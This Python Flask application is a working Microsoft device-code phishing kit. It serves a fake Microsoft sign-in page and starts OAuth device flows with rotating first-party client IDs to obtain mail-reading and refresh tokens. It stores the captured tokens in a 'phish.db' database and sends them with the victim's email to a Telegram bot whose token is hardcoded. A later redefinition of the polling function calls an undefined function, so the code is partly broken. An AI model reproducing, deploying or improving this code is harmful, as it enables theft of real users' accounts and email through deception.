import os
import time
import uuid
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
TENANT = "common"

# Rotating Client IDs (Public Clients)
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2", # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46", # Azure CLI
    "ab9b8c07-8f02-4f72-87fa-80105867a763", # OneDrive Sync
    "d3590ed6-52b3-4102-aeff-aad2292ab01c", # Office
    "00b41c95-dab0-4487-9791-b9d2c32c80f2", # Office 365 Management
    "268761a2-03f3-40df-8a8b-c3db24145b6b", # Universal Print
]
CLIENT_INDEX = 0

# Database Path (Render ephemeral storage)
DB_PATH = "/tmp/phish.db"

app = Flask(__name__)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'pending',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        created_at REAL
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initialize DB on startup
init_db()

# --- MICROSOFT API HELPERS ---
def initiate_device_flow():
    global CLIENT_INDEX
    attempts = 0
    while attempts < len(CLIENT_IDS):
        client_id = CLIENT_IDS[CLIENT_INDEX]
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
                data={
                    "client_id": client_id,
                    "scope": "openid profile offline_access Mail.Read Mail.ReadBasic User.Read"
                },
                timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                data["client_id"] = client_id
                return data
            elif "invalid_client" in resp.text:
                CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
                attempts += 1
                continue
            else:
                print(f"[MS INIT ERROR] {resp.text[:200]}")
                CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
                attempts += 1
        except Exception as e:
            print(f"[MS INIT EXCEPT] {e}")
            CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
            attempts += 1
    return None

def poll_token_status(device_code, client_id, interval=5):
    """Polls Microsoft until success or error. Runs in background thread."""
    start_time = time.time()
    while time.time() - start_time < 600: # Timeout after 10 mins
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
                data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "device_code": device_code,
                    "client_id": client_id
                },
                timeout=15
            )
            data = resp.json()
            
            if resp.status_code == 200:
                # SUCCESS! Extract tokens
                access_token = data.get("access_token", "")
                refresh_token = data.get("refresh_token", "")
                id_token = data.get("id_token", "")
                
                # Decode ID Token to get email (simple base64 decode of payload)
                victim_email = "unknown@unknown.com"
                try:
                    import base64, json
                    parts = id_token.split('.')
                    if len(parts) == 3:
                        payload = parts[1]
                        # Add padding if necessary
                        payload += '=' * (4 - len(payload) % 4)
                        decoded = json.loads(base64.b64decode(payload))
                        victim_email = decoded.get("preferred_username", decoded.get("upn", "unknown"))
                except:
                    pass

                # Update DB
                conn = get_db()
                conn.execute(
                    "UPDATE sessions SET status=?, access_token=?, refresh_token=?, id_token=? WHERE device_code=?",
                    ("completed", access_token, refresh_token, id_token, device_code)
                )
                conn.commit()
                conn.close()

                # Send to Telegram
                send_telegram_notification(victim_email, access_token, refresh_token, id_token)
                return

            elif data.get("error") == "authorization_pending":
                time.sleep(interval)
                continue
            elif data.get("error") == "slow_down":
                time.sleep(interval + 5)
                continue
            else:
                # Other error (expired, declined)
                conn = get_db()
                conn.execute("UPDATE sessions SET status=? WHERE device_code=?", ("failed", device_code))
                conn.commit()
                conn.close()
                return

        except Exception as e:
            print(f"[POLL ERROR] {e}")
            time.sleep(interval)

def send_telegram_notification(email, access_token, refresh_token, id_token):
    msg = f"""
🎯 <b>NEW CAPTURE</b> 🎯
👤 <b>Email:</b> <code>{email}</code>

🔑 <b>Access Token:</b>
<code>{access_token[:50]}...</code>

🔄 <b>Refresh Token:</b>
<code>{refresh_token[:50]}...</code>

🆔 <b>ID Token:</b>
<code>{id_token[:50]}...</code>
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg,
            "parse_mode": "HTML"
        })
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

# --- FLASK ROUTES ---

# Microsoft-style HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 2px; }
        .logo { margin-bottom: 20px; }
        .logo img { height: 24px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }
        p { font-size: 15px; color: #1b1b1b; margin-bottom: 20px; }
        .code-box { background: #f2f2f2; padding: 15px; font-size: 24px; font-weight: bold; text-align: center; letter-spacing: 2px; margin-bottom: 20px; border: 1px solid #ccc; cursor: pointer; user-select: all; }
        .btn { background: #0067b8; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; border-radius: 2px; transition: background 0.2s; }
        .btn:hover { background: #005da6; }
        .footer { margin-top: 30px; font-size: 12px; color: #666; text-align: center; }
        .error { color: red; font-size: 14px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
        </div>
        <h1>Sign in</h1>
        <p>To sign in, use the code shown below.</p>
        
        <div id="code-display" class="code-box" onclick="copyCode()">LOADING...</div>
        
        <button id="action-btn" class="btn" onclick="openLogin()" disabled>Open Microsoft Login</button>
        <div id="error-msg" class="error"></div>

        <div class="footer">
            <p>No longer have access to this device? <a href="#" style="color:#0067b8; text-decoration:none;">Try another way</a></p>
        </div>
    </div>

    <script>
        let sessionData = null;

        async function initSession() {
            try {
                const res = await fetch('/create-session');
                sessionData = await res.json();
                
                if (sessionData.error) {
                    document.getElementById('code-display').innerText = "Error loading code";
                    document.getElementById('error-msg').innerText = sessionData.error;
                    document.getElementById('error-msg').style.display = 'block';
                    return;
                }

                document.getElementById('code-display').innerText = sessionData.user_code;
                document.getElementById('action-btn').disabled = false;
                document.getElementById('action-btn').innerText = "Copy Code & Sign In";
                
                // Start polling status
                setInterval(checkStatus, 3000);
            } catch (e) {
                console.error(e);
            }
        }

        function copyCode() {
            if (sessionData && sessionData.user_code) {
                navigator.clipboard.writeText(sessionData.user_code);
                const btn = document.getElementById('action-btn');
                btn.innerText = "Code Copied! Click to Continue";
                btn.style.background = "#107c10"; // Green
            }
        }

        function openLogin() {
            if (sessionData) {
                // Copy first if not already done
                navigator.clipboard.writeText(sessionData.user_code);
                // Redirect to real Microsoft login in same tab
                window.location.href = sessionData.verification_uri;
            }
        }

        async function checkStatus() {
            if (!sessionData) return;
            try {
                const res = await fetch(`/status/${sessionData.device_code}`);
                const data = await res.json();
                
                if (data.status === 'completed') {
                    document.querySelector('.container').innerHTML = '<h1 style="text-align:center; color:green;">Success!</h1><p style="text-align:center;">You may close this window.</p>';
                } else if (data.status === 'failed') {
                    document.getElementById('error-msg').innerText = "Login failed or expired. Please refresh.";
                    document.getElementById('error-msg').style.display = 'block';
                }
            } catch (e) {
                console.error(e);
            }
        }

        // Initialize on load
        initSession();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/create-session')
def create_session():
    flow_data = initiate_device_flow()
    if not flow_data:
        return jsonify({"error": "Failed to initialize Microsoft login. Try again later."}), 500
    
    session_id = str(uuid.uuid4())
    device_code = flow_data['device_code']
    user_code = flow_data['user_code']
    verification_uri = flow_data['verification_uri']
    client_id = flow_data['client_id']
    
    # Save to SQLite
    conn = get_db()
    conn.execute(
        "INSERT INTO sessions (id, client_id, device_code, user_code, verification_uri, created_at) VALUES (?, ?, ?, ?, ?, ?)",
        (session_id, client_id, device_code, user_code, verification_uri, time.time())
    )
    conn.commit()
    conn.close()
    
    # Start polling thread for this specific device code
    t = Thread(target=poll_token_status, args=(device_code, client_id))
    t.daemon = True
    t.start()
    
    return jsonify({
        "device_code": device_code,
        "user_code": user_code,
        "verification_uri": verification_uri
    })

def poll_token_status(device_code, client_id):
    """Wrapper to handle threading errors cleanly"""
    try:
        poll_auth_status(device_code, client_id)
    except Exception as e:
        print(f"[THREAD CRASH] {e}")

@app.route('/status/<device_code>')
def check_status(device_code):
    conn = get_db()
    row = conn.execute("SELECT status FROM sessions WHERE device_code=?", (device_code,)).fetchone()
    conn.close()
    
    if row:
        return jsonify({"status": row['status']})
    return jsonify({"status": "not_found"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
